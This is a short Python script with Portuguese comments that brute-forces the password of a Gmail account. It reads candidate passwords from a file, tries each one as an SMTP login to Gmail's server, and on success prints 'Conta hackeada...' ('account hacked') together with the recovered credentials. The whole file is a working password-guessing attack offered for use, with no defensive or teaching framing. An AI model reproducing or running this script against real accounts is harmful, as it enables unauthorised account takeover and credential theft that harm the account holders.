# -*- coding: utf-8 -*-
import smtplib 
import os
login=raw_input("Digite o email: ")
arquivo=open("pad.txt", "r")
senhas=arquivo.readlines()
for senha in senhas: 
		server= smtplib.SMTP("smtp.gmail.com", 587) #conecta no servidor SMTP do gmail
		server.starttls() #realiza todo o processo de autenticação e troca de dados via TLS
		try: 
				server.login(login, senha) #tenta fazer login
		except smtplib.SMTPAuthenticationError: #se a senha não correponder ao gmail
				print("Erro ->", senha)
		else: 
				os.system("clear")
				print("\033[32mConta hackeada...\033[m")
				print("\033[34mLogin :\033[m  {}".format(login))
				print("\033[34mSenha :\033[m  {}".format(senha))
				break
		finally: 
				server.close()
